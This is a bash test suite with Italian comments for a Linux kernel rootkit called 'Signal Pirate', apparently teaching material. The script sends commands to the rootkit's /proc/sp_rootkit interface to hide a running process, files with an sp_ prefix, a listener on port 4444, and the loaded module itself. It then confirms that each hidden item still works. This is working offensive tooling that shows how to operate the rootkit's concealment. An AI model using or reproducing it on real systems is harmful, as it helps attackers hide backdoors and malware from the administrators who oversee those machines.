#!/bin/bash
# ============================================================
# test_rootkit.sh — Testa tutte le funzionalita' del rootkit
# Signal Pirate
#
# Esegui DOPO aver fatto: make && sudo insmod rootkit.ko
# ============================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}=== Signal Pirate — Rootkit Test Suite ===${NC}"
echo ""

# ---- TEST 1: Nascondere un processo ----
echo -e "${YELLOW}[TEST 1] Nascondere un processo${NC}"
echo ""

# Lancia un processo di test
sleep 99999 &
TARGET_PID=$!
echo -e "  Processo lanciato: sleep 99999 (PID ${GREEN}$TARGET_PID${NC})"

# Verifica che sia visibile
echo -n "  Visibile in ps? "
if ps aux | grep -q "[s]leep 99999"; then
    echo -e "${GREEN}SI${NC}"
else
    echo -e "${RED}NO (errore)${NC}"
fi

# Nascondi il PID
echo "  Nascondo PID $TARGET_PID..."
echo "pid $TARGET_PID" | sudo tee /proc/sp_rootkit > /dev/null

# Verifica che sia nascosto
sleep 0.5
echo -n "  Visibile in ps? "
if ps aux | grep -q "[s]leep 99999"; then
    echo -e "${RED}SI (rootkit non funziona)${NC}"
else
    echo -e "${GREEN}NO — processo nascosto!${NC}"
fi

# Il processo gira ancora?
echo -n "  Il processo gira ancora? "
if kill -0 $TARGET_PID 2>/dev/null; then
    echo -e "${GREEN}SI — invisibile ma attivo${NC}"
else
    echo -e "${RED}NO${NC}"
fi

kill $TARGET_PID 2>/dev/null
echo ""

# ---- TEST 2: Nascondere un file ----
echo -e "${YELLOW}[TEST 2] Nascondere un file${NC}"
echo ""

TEST_FILE="sp_hidden_secret.txt"
echo "questo file non esiste" > /tmp/$TEST_FILE

echo -n "  File $TEST_FILE visibile in /tmp? "
if ls /tmp/ | grep -q "$TEST_FILE"; then
    echo -e "${RED}SI (rootkit non funziona)${NC}"
else
    echo -e "${GREEN}NO — file nascosto!${NC}"
fi

echo -n "  Ma posso leggerlo direttamente? "
if cat /tmp/$TEST_FILE > /dev/null 2>&1; then
    echo -e "${GREEN}SI — il file esiste, e' solo invisibile${NC}"
else
    echo -e "${RED}NO${NC}"
fi

rm -f /tmp/$TEST_FILE
echo ""

# ---- TEST 3: Nascondere una connessione TCP ----
echo -e "${YELLOW}[TEST 3] Nascondere una connessione TCP${NC}"
echo ""

# Lancia un listener sulla porta nascosta
python3 -c "
import socket, time
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 4444))
s.listen(1)
time.sleep(60)
" &
LISTENER_PID=$!
sleep 0.5

echo -n "  Porta 4444 visibile in ss? "
if ss -tlnp 2>/dev/null | grep -q ":4444"; then
    echo -e "${RED}SI (rootkit non funziona per TCP)${NC}"
else
    echo -e "${GREEN}NO — connessione nascosta!${NC}"
fi

echo -n "  Ma la porta e' aperta? "
if timeout 1 bash -c 'echo > /dev/tcp/127.0.0.1/4444' 2>/dev/null; then
    echo -e "${GREEN}SI — la connessione c'e', e' solo invisibile${NC}"
else
    echo -e "${YELLOW}Verifica manuale necessaria${NC}"
fi

kill $LISTENER_PID 2>/dev/null
echo ""

# ---- TEST 4: Nascondere il modulo ----
echo -e "${YELLOW}[TEST 4] Nascondere il modulo${NC}"
echo ""

echo -n "  Modulo visibile in lsmod? "
if lsmod | grep -q rootkit; then
    echo -e "${GREEN}SI${NC}"
else
    echo -e "${YELLOW}Gia' nascosto${NC}"
fi

echo "  Nascondo il modulo..."
echo "hide" | sudo tee /proc/sp_rootkit > /dev/null

echo -n "  Modulo visibile in lsmod? "
if lsmod | grep -q rootkit; then
    echo -e "${RED}SI (hide non ha funzionato)${NC}"
else
    echo -e "${GREEN}NO — modulo nascosto!${NC}"
fi

echo -n "  /sys/module/rootkit esiste? "
if [ -d /sys/module/rootkit ]; then
    echo -e "${RED}SI${NC}"
else
    echo -e "${GREEN}NO — completamente invisibile${NC}"
fi

# Rimostra il modulo per cleanup
echo "unhide" | sudo tee /proc/sp_rootkit > /dev/null

echo ""
echo -e "${CYAN}=== Test completati ===${NC}"
echo ""
echo -e "Per rimuovere: ${GREEN}sudo rmmod rootkit${NC}"
